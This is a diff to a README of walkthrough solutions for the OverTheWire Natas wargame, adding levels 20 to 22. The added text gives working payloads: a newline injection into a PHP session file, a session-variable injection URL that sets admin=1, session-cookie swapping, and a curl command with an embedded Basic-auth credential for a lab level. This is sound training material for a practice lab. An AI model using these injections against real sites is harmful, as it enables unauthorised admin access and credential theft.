@@ -1,10 +1,6 @@
-
-
-
-
 # OverTheWire Natas Solutions
 
-![Code](https://img.shields.io/badge/Code-Markdown-orange?logo=markdown) ![Coverage](https://img.shields.io/badge/Coverage-50%25-yellow) ![Status](https://img.shields.io/badge/Status-In_production-green)
+![Code](https://img.shields.io/badge/Code-Markdown-orange?logo=markdown) ![Coverage](https://img.shields.io/badge/Coverage-65%25-lightgreen) ![Status](https://img.shields.io/badge/Status-In_production-green)
 
 This is a collection of solution for the [OverTheWire Natas](https://overthewire.org/wargames/natas/) problems, a collection of 34 levels, each dealing with the basics of web security. All of the levels are found at http://natasX.natas.labs.overthewire.org, where X is the level number. To access each challenge, we need a:
 - Username: `natasX`, where X is the level number.
@@ -36,6 +32,8 @@ Please use these as hints to solve the challenges yourself. Do not use them to c
 - [Level 18](#level18)
 - [Level 19](#level19)
 - [Level 20](#level20)
+- [Level 21](#level21)
+- [Level 22](#level22)
 - [Final Notes](#finalnotes)
 
 ## Level 0 <a name="level0"></a>
@@ -1447,13 +1445,191 @@ That's a lot of code. Let's see what it actually does: we're enabling debug by a
 ![Debug](/imgs/lvl20/debug.png)
 
 Seems like our name is being written to a file inside `/var/lib/php/sessions/mysess_{encoded string}` by the function `mywrite()` in the source. Looks like have some kind of file management going on (as indicated from the functions `myopen()` \<empty>, `myclose()` \<empty>, `myread()`, `mywrite()`, `mydestroy()` \<empty>, and `mygarbage()` \<empty>). <br>
-Reading the code carefully, a few things pop up as strange: for example, in the `mywrite()` function we write `$data` which contains `$key $value\n`, but we only input the `$name`, and then in `myread()` it runs through every line of the file `foreach(explode("\n", $data) as $line)`. Now this looks like a vulnerability. If we can inject both the `$key` and `$value` inside the file, we can then read it and use it to gain access to the password. Something like: `"test\nadmin 1"` $\Rightarrow$ `"test {random value}\nadmin 1"` $\Rightarrow$ read as `test {random value}` and `admin 1`. Since it authenticates only the last line, we become admin. <br>
- 
+Reading the code carefully, a few things pop up as strange:
+- In the `mywrite()` function we write `foreach($_SESSION as $key => $value) {  debug("$key => $value");  $data .= "$key  $value\n";  }`, which contains `$key $value\n`
+- In `myread()` it runs through every line of the file `foreach(explode("\n", $data) as $line)`.
+
+Now this looks like a vulnerability. If we can inject both the `$key` and `$value` inside the file, we can then read it and use it to gain access to the password. Something like: 
+<p align="center">
+
+`name=test\nadmin 1` $\Rightarrow$ written as `test {value}\nadmin 1` $\Rightarrow$ read as `test {value}` and `admin 1` 
+
+</p>
+Since it authenticates only the last username, we become admin with the value 1. <br>Working with PHP and the GET protocol, we can modify variables inside the URL itself, and implant our malicious payload like: http://natas20.natas.labs.overthewire.org/?name=test%0Aadmin%201, where `%0A` is a newline character, and `%20` an empty space. After sending it a couple of times, so that the write and read take effect, we can look at what the debug tells us:
+
+![Final debug](/imgs/lvl20/f_debug.png)
+
+We first write `test admin 1`, which is invalid due to how it should be written, and then `admin 1`, our payload. After re-sending it, we do a read on the same file since we're still in the same session, and read `name test` (invalid), then `admin 1`, which is set as our username, authenticating us as an admin, and grant us permission to view the password for the next level.
+
+## Level 21 <a name="level21"></a>
+Landing on the site, we see this:
+
+![Level 21](/imgs/lvl21/screenshot1.png)
+
+We have a web app colocated with another one at a different URL:
+> Colocation happens when a [colocation center](https://en.wikipedia.org/wiki/Colocation_centre) rents a server on which more than one site can be hosted on. Usually, being located in the same machine means they share space and variable.
+
+Let's see the other site:
+
+![Level 21](/imgs/lvl21/screenshot2.png)
+
+Here, it seems they share the same session, as the source code for both tells us: <br>
+[`http://natas21.natas.labs.overthewire.org/`](http://natas21.natas.labs.overthewire.org/)
+```php
+<?php  
+  
+function print_credentials() { /* {{{ */  
+	if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) {  
+		print "You are an admin. The credentials for the next level are:<br>";  
+		print "<pre>Username: natas22\n";  
+		print "Password: <censored></pre>";  
+	} else {  
+		print "You are logged in as a regular user. Login as an admin to retrieve credentials for natas22.";  
+	}  
+}  
+/* }}} */  
+  
+session_start();  
+print_credentials();  
+  
+?>
+```
+[`http://natas21-experimenter.natas.labs.overthewire.org/`](http://natas21-experimenter.natas.labs.overthewire.org/)
+```php
+`<?php  
+  
+session_start();  
+  
+// if update was submitted, store it  
+if(array_key_exists("submit", $_REQUEST)) {  
+	foreach($_REQUEST as $key => $val) {  
+		$_SESSION[$key] = $val;  
+	}  
+}  
+  
+if(array_key_exists("debug", $_GET)) {  
+	print "[DEBUG] Session contents:<br>";  
+	print_r($_SESSION);  
+}  
+  
+// only allow these keys  
+$validkeys = array("align" => "center", "fontsize" => "100%", "bgcolor" => "yellow");  
+$form = "";  
+  
+$form .= '<form action="index.php" method="POST">';  
+foreach($validkeys as $key => $defval) {  
+	$val = $defval;  
+	if(array_key_exists($key, $_SESSION)) {  
+		$val = $_SESSION[$key];  
+	} else {  
+		$_SESSION[$key] = $val;  
+	}  
+	$form .= "$key: <input name='$key' value='$val' /><br>";  
+}  
+$form .= '<input type="submit" name="submit" value="Update" />';  
+$form .= '</form>';  
+  
+$style = "background-color: ".$_SESSION["bgcolor"]."; text-align: ".$_SESSION["align"]."; font-size: ".$_SESSION["fontsize"].";";  
+$example = "<div style='$style'>Hello world!</div>";  
+  
+?>  
+  
+<p>Example:</p>  
+<?=$example?>  
+  
+<p>Change example values here:</p>  
+<?=$form?>`
+```
+Let's look at the second site, since it's the one that allows us more freedom. Looking at the code, we have a CSS editor in real time. It uses user input to change the values, yet it is not sanitized. We can then use a payload to inject custom variables in a [Cross-Subdomain Session Cookies Injection](https://capec.mitre.org/data/definitions/261.html). Let's see what the debug tells us:
+
+![Debug](/imgs/lvl21/debug.png)
+
+We see that the session is an array of values, which based on the code are the `align`, `fontsize`, and `bgcolor` and their respective values. If we can manage to inject `admin => 1` in the session, we can then manipulate our authentication on the original Natas site and gain access. Since we're working with PHP and GET, let's do just that in the URL: we need to pass the necessary arguments first, then search using the parameter `Search`, and activate debug to see if it was successful: <br>
+`http://natas21-experimenter.natas.labs.overthewire.org/index.php?align=center&fontsize=100%25&admin=1&bgcolor=yellow&submit=Update&debug`
+
+![Payload](/imgs/lvl21/payload.png)
+
+We have injected our code. Now if we go back to the original site, there are no visible changes. That's because, looking a bit deeper, we have two different `PHPSESSID` in the sites. Just changing it to the same one as the CSS editor gives us the solution:
+```html
+<html>
+	<head>
+		****
+	</head>
+	<body>
+		<h1>natas21</h1>
+		<div id="content">
+			<p>
+				<b>Note: this website is colocated with <a href="http://natas21-experimenter.natas.labs.overthewire.org">http://natas21-experimenter.natas.labs.overthewire.org</a>
+				</b>
+			</p>
+
+			You are an admin. The credentials for the next level are:<br>
+			<pre>Username: natas22
+					Password: ****</pre>
+			<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+		</div>
+	</body>
+</html>
+```
+
+## Level 21 <a name="level21"></a>
+Landing on the site, we see this:
+
+![Level 22](/imgs/lvl22/screenshot.png)
+
+We have a blank page? Let's look at the source code to see what's happening behind the curtain:
+```php
+<?php  
+session_start();  
+  
+if(array_key_exists("revelio", $_GET)) {  
+	// only admins can reveal the password  
+	if(!($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1)) {  
+		header("Location: /");  
+	}  
+}  
+?>
+...
+<?php  
+if(array_key_exists("revelio", $_GET)) {  
+	print "You are an admin. The credentials for the next level are:<br>";  
+	print "<pre>Username: natas23\n";  
+	print "Password: <censored></pre>";  
+}  
+?>
+```
+The first if case is a strange one: if there's `"revelio"` in the GET request, and we're not admin, it brings us back to `http://natas22.natas.labs.overthewire.org/`. We can confirm that we have indeed moved in the Developer Tools[^1] by seeing the [status code 302](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Status/302?utm_source=mozilla&utm_medium=devtools-netmonitor&utm_campaign=default) and the Location header is set to `/`:
+
+![Redirect](/imgs/lvl22/redirect.png)
+
+If we can roundabout this redirection and stay in the page, we can clear the second if case and see the solution for the challenge. Let's use some commands: [cURL](https://curl.se/) (often called `curl`) is used in command lines or scripts to transfer data to and with URLs. Let's use it to retrieve the password:
+```bash
+curl -H 'Authorization: Basic bmF0YXMyMjpkOHJ3R0JsMFhzbGczYjc2dWgzZkViU2xuT1VCbG96eg==' http://natas22.natas.labs.overthewire.org/index.php?revelio
+```
+And we get:
+```html
+<html>
+	<head>
+		...
+	</head>
+	<body>
+		<h1>natas22</h1>
+		<div id="content">
+
+			You are an admin. The credentials for the next level are:<br>
+			<pre>Username: natas23
+					Password: **** </pre>
+			<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+		</div>
+	</body>
+</html>
+```
+
 ## Final Notes <a name="finalnotes"></a>
 This project is under the [GPL-3.0 License](https://www.gnu.org/licenses/gpl-3.0.html). Any use or distribution is completely free, unless edited. <br>
 [OverTheWire Natas](https://overthewire.org/wargames/natas/), its challenges and solutions are all under their domain. I claim nothing. If you liked the challenges, please consider [donating](https://overthewire.org/information/donate.html) to them. <br>
 Huge thanks to [CAPEC](https://capec.mitre.org/index.html) and [CWE](https://cwe.mitre.org/) for explanations and code examples. <br>
-Main contributors:
+Main contributors: <br>
 \- [Unpwnabl](https://github.com/unpwnabl) (owner)
 
 ---
@@ -1463,10 +1639,3 @@ Main contributors:
 [^3]: \- `convert` is part of [ImageMagick](https://github.com/ImageMagick/ImageMagick), necessary to have a smaller image (9x9 is a arbitrary dimension I chose). <br>
 \- `>>` redirect stdout to file. <br>
 \- Thanks to [Synactivy](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there)  for the explanation and some commands.
-
-
-
-
-
-
-
